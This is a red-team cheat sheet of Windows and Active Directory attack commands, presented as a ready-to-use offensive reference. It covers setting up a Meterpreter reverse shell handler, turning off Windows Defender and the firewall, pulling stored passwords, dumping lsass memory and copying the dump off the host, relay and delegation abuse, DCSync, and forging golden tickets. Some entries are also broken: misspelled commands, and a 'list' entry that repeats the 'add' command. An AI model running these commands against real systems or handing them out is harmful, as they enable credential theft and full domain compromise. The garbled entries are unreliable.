# Red-team-linux-cheatsheet

# MSFConsole
#### Start listener
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

#### Background the sessions
```
Background
```

#### List sessions
```
sessions
```

#### Kill session
```
sessions -k <id>
```

#### Enter sessions
```
sessions -i <id>
```

#### Load kiwi module to dump creds and print help for kiwi
```
load kiwi
help kiwi
```

#### Load PowerShell and drop into shell
```
load powershell
powershell_shell
```

#### Set route
```
route add <subnet / host ip> <subnetmask> <session id>
```

# Post-Exploitation
#### Get scheduled tasks
```
Get-ScheduledTask
```

#### Find autologon credentials registery key
```
Get-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\WinLogon" -Name "DefaultPassword"
```
#### Get info about Windows Defender
```
Get-MpPreference
```

#### Find excluded folder from Windows Defender
```
(Get-MpPreference).Exclusionpath
```

#### Turn off Windows Defender
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Turn off Windows Firewall Powershell
```
Set-NetFirewallProfile -Name Domain,Private,Public -Enabled False
```

#### Turn off Windows Firewall cmd
```
netsh advfirewall set allprofiles state off
```

#### Get powershell history path and cat history
```
Get-PSReadlineOption
cat <path>
```

## Port forwarding
#### Port forward with netsh (cmd)
```
Ntsh interface portproxy add v4tov4 listenport=443 listenaddress=xx.xx.xx.xx connectaddress=xx.xx.xx.xx connectport=445
```

#### List forwarded ports netsh
```
Ntsh interface portproxy add v4tov4 listenport=443 listenaddress=xx.xx.xx.xx connectaddress=xx.xx.xx.xx connectport=445
```

## Dump lsass to a file (for when MimiKatz doesn't work)
#### Get process id from lsass process
```
Powershell Get-Process lsass
```

#### Dump lsass to a file
```
Powershell rundll32.exe C:\windows\System32\comsvc.dll, MiniDump <procesid> C:\Users\lsass.dmp full
```

#### Get the file from the machine for example with smbclient
```
cd <path>
get lsass.dmp
```

#### Dump the lsass.dmp file with pypykatz
```
Pypykatz lsa minidump lsass.dmp
```

## PSRemoting
#### Save PS credentials powershell commandline only
```
$passwd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("domain\user", $passwd)
```

#### Save credentials with gui
```
$creds = Get-Credential
```

#### Use credentials with invoke-command for example
```
Invoke-command -ScriptBlock{hostname;whoami;Get-LocalGroupMember -Group Administrators} -Computer <computername> -Credential $creds
```

## Application whitelisting
#### Get current language mode
```
$ExecutionContext.SessionState.Languagemode
```

#### Check if applocker is active
```
Get-AppLockerPolicy -Effective
Get-CimInstance -Classname Win32_DeviceGaurd -Namespace root\Microsoft\Windows\DeviceGaurd
```

## Abusing SQLServers with msfconsole
```
use module mssql_login to check credentials
use mssql_login to enumerate sql
use mssql_sql to run queries
```

## Unconstrained Delegation
#### Find delegation with impacket
```
Python findDelegation.py <domain>/<user>:<password> -dc-ip xx.xx.xx.xx
```

#### Add SPN to a machine
```
python3 addspn.py -u <domain>\\<machine name>\$ -p aad3b435b51404eeaad3b435b51404ee:<rc4 computer hash> -s HOST/<spn> <dc ip> --additional
```

#### Modify dns records in the domain so that the DC knows the IP for the alternate DNS name we added (any authenticated user can do this)
```
python3 dnstool.py -u <domain>\\<machine name>\$ -p aad3b435b51404eeaad3b435b51404ee:<rc4 computer hash> -r <spn> -d <our ip> --action add <dc ip>
```

#### Start krbrelayx with aes256 key of computer
```
python3 krbrelayx.py -aesKey <aeskey>
```

#### Trigger printer bug that forces DC to authenticate to machine.
```
python3 printerbug.py -hashes aad3b435b51404eeaad3b435b51404ee:<rc4 computer hash> <domain>/<computername>\$@<computername dc> <spn>
```

#### Use ticket with secretsdump.py
```
export KRB5CCNAME=<ticket>
```

#### Use DCSync attack
```
python secretsdump.py -k <computername dc> -just-dc
```

#### Create golden ticket with KRBTGT hash
```
python ticketer.py -aesKey <krbtgt aes256 hash> -domain-sid <domain sid> -domain <domain> Administrator
```

#### Connect with golden ticket
```
python smbexec.py <domain>/Administrator@<computername dc> -k -no-pass
```

## Crackmapexec
#### Get the password policy
```
cme smb <ip> -u <username> -p <password> --pas-pol
```

#### List the shares
```
cme smb <ip> -u <username> -p <password> --shares
```

#### Cat .cme.conf to change workspace and other configurations
```
cd .cme && cat cme.conf
```

#### Interact with cme database and see creds
```
cmedb
creds
```

#### Use credentials from cme database
```
cme smb <ip> --id 5
```

#### Use the lsassy module
```
cme smb -m lsassy –options
procdump_path can automate dumping hashes with procpdump
```

#### Use the gpp_autologin to check for auto login credentials

#### Tee the output to a log file since you want to be able to look back on the output
```
| tee -a cme.log
```
